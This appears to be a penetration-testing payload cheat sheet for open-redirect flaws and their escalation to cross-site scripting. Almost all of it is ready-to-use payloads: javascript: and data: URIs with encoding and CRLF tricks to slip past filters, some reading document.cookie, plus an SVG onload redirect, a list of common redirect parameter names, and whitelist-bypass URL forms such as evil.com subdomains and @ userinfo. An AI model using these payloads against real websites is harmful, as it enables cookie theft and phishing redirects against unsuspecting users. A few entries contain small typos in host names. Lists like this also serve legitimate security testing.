# Open Redirect to XSS


```js
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```

# Open Redirect uploading svg files

```html
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```

# Common injection parameters

```html
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://github.io
data=https://github.io
qurl=https://github.io
login=https://github.io
logout=https://github.io
ext=https://github.io
clickurl=https://github.io
goto=https://github.io
rit_url=https://cgithub.io
forward_url=https://github.io
@https://github.io
forward=https://github.io
pic=https://github.io
callback_url=https://github.io
jump=https://github.io
jump_url=https://github.io
click?u=https://github.io
originUrl=https://github.io
origin=https://github.io
Url=https://github.io
desturl=https://github.io
u=https://github.io
page=https://github.io
u1=https://github.io
action=https://github.io
action_url=https://github.io
Redirect=https://github.io
sp_url=https://github.io
service=https://github.io
recurl=https://github.io
j?url=https://github.io
url=//https://github.io
uri=https://github.io
u=https://github.io
allinurl:https://github.io
q=https://github.io
link=https://github.io
src=https://ithub.io
tc?src=https://github.io
linkAddress=https://github.io
location=https://github.io
burl=https:/.github.io
request=https://github.io
backurl=https://github.io
RedirectUrl=https://github.io
Redirect=https://github.io
ReturnUrl=https://github.io
```
# Filter Bypass

Using a whitelisted domain or keyword
```
www.whitelisted.com.evil.com redirect to evil.com
```
Using CRLF to bypass "javascript" blacklisted keyword
```
java%0d%0ascript%0d%0a:alert(0)
```
Using "//" & "////" to bypass "http" blacklisted keyword
```
//google.com
////google.com
```
Using "https:" to bypass "//" blacklisted keyword

```
https:google.com
```
Using "//" to bypass "//" blacklisted keyword (Browsers see // as //)

```
\/\/google.com/
/\/google.com/
```

Using "%E3%80%82" to bypass "." blacklisted character
```
/?redir=google。com
//google%E3%80%82com
```
Using null byte "%00" to bypass blacklist filter
```
//google%00.com
```
Using parameter pollution

```
?next=whitelisted.com&next=google.com
```
Using "@" character, browser will redirect to anything after the "@"
```
http://www.theirsite.com@yoursite.com/
```

Creating folder as their domain

```
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```
Using "?" characted, browser will translate it to "/?"
```
http://www.yoursite.com?http://www.theirsite.com/
http://www.yoursite.com?folder/www.folder.com
```
Host/Split Unicode Normalization
```
https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
http://a.com／X.b.com
```
XSS from Open URL - If it's in a JS variable
```
";alert(0);//
```
XSS from data:// wrapper
```
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```
XSS from javascript:// wrapper
```
http://www.example.com/redirect.php?url=javascript:prompt(1)
```







